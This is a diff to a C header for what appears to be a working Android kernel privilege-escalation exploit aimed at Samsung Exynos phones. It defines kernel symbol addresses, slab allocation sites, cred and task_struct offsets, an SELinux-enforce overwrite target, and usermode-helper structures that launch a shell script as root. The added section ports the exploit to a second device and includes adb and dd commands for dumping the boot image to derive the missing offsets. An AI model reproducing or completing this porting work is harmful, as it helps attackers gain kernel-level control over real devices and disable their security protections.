@@ -3,20 +3,47 @@
  * payload.  Everything in this file is specific to ONE kernel build; the
  * payload logic in timer.c is generic.
  *
- * Device: Samsung SM-S921N (e1s), Exynos 2400
- * Kernel: 6.1.162-android14-11 (OneUI 9)
+ * Supported devices (select via -DTARGET_SM_<MODEL> at compile time):
  *
- * Derived from the device's vmlinux (symtab + disasm).  To port to another
- * kernel, re-derive each group:
- *   - *_STATIC   unslid (link-time) symbol addresses from the symbol table
- *   - *_SITE     kmem_cache_alloc return addresses (matched in the kmem
- *                trace against site_static + slide; slide is 64KB-granular)
- *   - *_LOW21    the low 21 bits of a site, for the trace record match
+ *   TARGET_SM_S921N  Samsung SM-S921N (e1s), Exynos 2400
+ *                    Kernel: 6.1.162-android14-11 (OneUI 9)
+ *                    Status: verified, production
+ *
+ *   TARGET_SM_A556E  Samsung SM-A556E (a56x), Exynos 1480
+ *                    Kernel: 6.1.162-android14-11 (OneUI 9)
+ *                    Status: PENDING — constants marked TODO must be filled
+ *                            in by running tools/derive_offsets_btf.py and
+ *                            tools/derive_offsets_nm.py on the target device.
+ *                    See tools/ for instructions.
+ *
+ * To port to a new device, re-derive each constant group:
+ *   - *_STATIC   unslid (link-time) symbol addresses (nm vmlinux.elf)
+ *   - *_SITE     kmem_cache_alloc return addresses (objdump disasm)
+ *   - *_LOW21    low 21 bits of a site (vestigial; for reference only)
  *   - *_OFF      struct field offsets (BTF / disasm verified)
- *   - *_ALLOC / *_BYTES / *_REQ  kmem_cache object sizes
+ *   - *_ALLOC / *_BYTES / *_REQ  kmem_cache object sizes (BTF/pahole)
+ *
+ * DO NOT add a new device to device_check.h until ALL constants are filled
+ * in and verified on a physical device.
  */
 #ifndef OFFSETS_H
 #define OFFSETS_H
+
+/* =========================================================================
+ * Device selection guard.
+ * Pass -DTARGET_SM_S921N=1 or -DTARGET_SM_A556E=1 to the compiler.
+ * The build system (app/build.gradle.kts) sets this automatically via the
+ * targetDevice Gradle property (default: s921n).
+ * ========================================================================= */
+#if !defined(TARGET_SM_S921N) && !defined(TARGET_SM_A556E)
+/* Default to S921N for backward compatibility with manual builds. */
+#define TARGET_SM_S921N 1
+#endif
+
+#if defined(TARGET_SM_S921N)
+/* =========================================================================
+ * SM-S921N (Exynos 2400) — verified production constants
+ * ========================================================================= */
 
 /* Page-size assumption: the linear-map pfn math and the order-1 reclaim
  * channel both hard-code 4 KB pages.  16 KB-page devices need a port. */
@@ -241,5 +268,155 @@ struct umh_subprocess_info
  */
 #define POOL_NR_WORKERS_OFF 0x38
 #define POOL_NR_IDLE_OFF 0x3c
+
+#elif defined(TARGET_SM_A556E)
+/* =========================================================================
+ * SM-A556E (Exynos 1480) — PENDING.
+ *
+ * How to fill in the placeholder (0) values:
+ *   Step 1 — struct offsets (no root required):
+ *     adb shell cat /sys/kernel/btf/vmlinux > a55_btf.bin
+ *     adb shell cat /proc/iomem > a55_iomem.txt
+ *     python3 tools/derive_offsets_btf.py a55_btf.bin
+ *
+ *   Step 2 — symbol addresses (requires vmlinux ELF):
+ *     adb shell "dd if=/dev/block/by-name/boot of=/sdcard/boot_a55.img bs=4096"
+ *     adb pull /sdcard/boot_a55.img .
+ *     pip install vmlinux-to-elf
+ *     vmlinux-to-elf boot_a55.img a55_vmlinux.elf
+ *     python3 tools/derive_offsets_nm.py a55_vmlinux.elf --iomem a55_iomem.txt
+ *
+ *   If the boot partition read is denied, download the kernel source from
+ *   opensource.samsung.com (SM-A556E, Android 14) and compile to get vmlinux.
+ *
+ *   Once ALL placeholder values are replaced with real values, set
+ *   OFFSETS_A556E_COMPLETE to 1 to lift the build guard below.
+ *   Then add "SM-A556E" to device_check.h and RootService.kt.
+ * ========================================================================= */
+
+/* Build guard: prevents accidentally compiling a binary with placeholder
+ * zeroes that would immediately corrupt kernel memory.  Set to 1 only
+ * after every 0 /* TODO */ value below is replaced with a real constant. */
+#define OFFSETS_A556E_COMPLETE 0
+#if !OFFSETS_A556E_COMPLETE
+#error "SM-A556E offsets are incomplete. Run tools/derive_offsets_btf.py and tools/derive_offsets_nm.py, fill in all placeholder values, then set OFFSETS_A556E_COMPLETE=1."
+#endif
+
+/* Page size (4 KB; verify: adb shell getprop ro.product.cpu.abilist) */
+#define PAGE 4096UL
+
+/* --- struct sizes (derive_offsets_btf.py output) --- */
+#define TIMER_ALLOC     0 /* TODO: sizeof(k_itimer) */
+#define CRED_REQ        0 /* TODO: sizeof(cred) */
+#define CRED_ALLOC      0 /* TODO: HWCACHE_ALIGN(sizeof(cred)) */
+
+/* --- cred field offsets (likely same as S921N; verify via BTF) --- */
+#define CRED_UID_OFF         0x4ULL
+#define CRED_SECUREBITS_OFF  0x24ULL
+#define SELINUX_BLOB_OFF     0x0ULL
+#define SELINUX_SID_KERNEL   1U
+#define FULLCAP              0x1ffffffffffULL
+
+/* --- task_struct offsets (derive_offsets_btf.py output) --- */
+#define OFF_TASK_CRED       0 /* TODO */
+#define TASK_ALLOC_BYTES    0 /* TODO: sizeof(task_struct) */
+#define OFF_TASK_LOGINUID   0 /* TODO */
+#define OFF_TQ_LEFTMOST_0   0 /* TODO: posix_cputimers.bases[0] rb_leftmost */
+#define OFF_TQ_LEFTMOST_1   0 /* TODO: posix_cputimers.bases[1] rb_leftmost */
+#define OFF_TQ_LEFTMOST_2   0 /* TODO: posix_cputimers.bases[2] rb_leftmost */
+
+/* --- vmlinux symbol addresses (derive_offsets_nm.py output) --- */
+#define STATIC_TIMER_SITE        0 /* TODO */
+#define TIMER_SITE_LOW21         0 /* TODO */
+#define CRED_SITE_STATIC         0 /* TODO */
+#define TASK_SITE_STATIC         0 /* TODO */
+#define TASK_ALLOC_LOW21         0 /* TODO */
+#define SELINUX_STATE_STATIC     0 /* TODO */
+#define PANIC_ON_WARN_STATIC     0 /* TODO */
+#define SYSTEM_UNBOUND_WQ_STATIC 0 /* TODO */
+#define UMH_EXEC_WORK_STATIC     0 /* TODO */
+#define CREDS_FAST_HASH_STATIC   0 /* TODO */
+#define ROOT_USER_STATIC         0 /* TODO */
+#define INIT_USER_NS_STATIC      0 /* TODO */
+#define INIT_UCOUNTS_STATIC      0 /* TODO */
+#define INIT_GROUPS_STATIC       0 /* TODO */
+#define ANON_PIPE_BUF_OPS_STATIC 0 /* TODO */
+
+/* SELINUX_ENFORCE_ZAP: verify via derive_offsets_btf.py selinux_state output.
+ * The -7 is correct for S921N.  Replace if the enforcing/initialized layout
+ * differs on Exynos 1480. */
+#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - 7ULL) /* TODO verify delta */
+
+/* --- physical memory layout (from /proc/iomem + derive_offsets_nm.py) --- */
+#define MEMSTART_ADDR    0 /* TODO: first System RAM start in /proc/iomem */
+#define KERNEL_PHYS_LOAD 0 /* TODO: usually == MEMSTART_ADDR on Exynos */
+#define KERNEL_PHYS_CANDIDATES \
+    0x80000000ULL, 0xa8000000ULL, 0xa0000000ULL, 0x88000000ULL, \
+    0x90000000ULL, 0xb0000000ULL
+
+/* --- architecture constants (safe to copy from SM-S921N: VA_BITS=39 AArch64) --- */
+#define VMEMMAP_BASE     0xfffffffe00000000ULL
+#define STRUCT_PAGE_SIZE 0x40ULL
+#define KERNEL_VA_BASE   0xffffffc008000000ULL
+#define PIPE_BUF_FAKE_OFF 0x28ULL
+#define ROOT_UMH_WORK_OFF 0x400
+#define ROOT_UMH_DATA_OFF 0x800
+#define ROOT_UMH_PWQ_OFF  0xa00
+#define ROOT_UMH_PATH "/system/bin/sh"
+#define ROOT_UMH_ARG  "/data/local/tmp/samtimer/umh_action.sh"
+
+/* --- workqueue offsets (derive_offsets_btf.py output; likely same as S921N) --- */
+#define WQ_DFL_PWQ_OFF       0 /* TODO */
+#define PWQ_POOL_OFF         0x00
+#define PWQ_WQ_OFF           0x08
+#define PWQ_WORK_COLOR_OFF   0x10
+#define PWQ_REFCNT_OFF       0x18
+#define PWQ_NR_IN_FLIGHT_OFF 0x1c
+#define PWQ_NR_ACTIVE_OFF    0 /* TODO */
+#define PWQ_MAX_ACTIVE_OFF   0 /* TODO */
+#define POOL_WORKLIST_OFF    0x28
+#define POOL_NR_WORKERS_OFF  0 /* TODO */
+#define POOL_NR_IDLE_OFF     0 /* TODO */
+#define WORK_DATA_OFF        0x00
+#define WORK_ENTRY_OFF       0x08
+#define WORK_FUNC_OFF        0x18
+#define PIPE_INFO_BUF_OFF    0 /* TODO */
+
+/* struct definitions (same layout as SM-S921N; mainline kernel structs) */
+struct umh_completion
+{
+    unsigned done;
+    unsigned pad0;
+    unsigned lock;
+    unsigned pad1;
+    unsigned long long next;
+    unsigned long long prev;
+};
+struct umh_kernel_data
+{
+    struct umh_completion completion; /* 32 */
+    char path[256];
+    char arg[16];
+    char uid[16];
+    unsigned long long argv[4];
+    unsigned long long envp[1];
+};
+struct umh_subprocess_info
+{
+    unsigned char work[48];
+    unsigned long long complete;
+    unsigned long long path;
+    unsigned long long argv;
+    unsigned long long envp;
+    int wait;
+    int retval;
+    unsigned long long init;
+    unsigned long long cleanup;
+    unsigned long long data;
+};
+
+#else
+#error "No target device selected. Pass -DTARGET_SM_S921N=1 or -DTARGET_SM_A556E=1"
+#endif /* TARGET_SM_* */
 
 #endif /* OFFSETS_H */
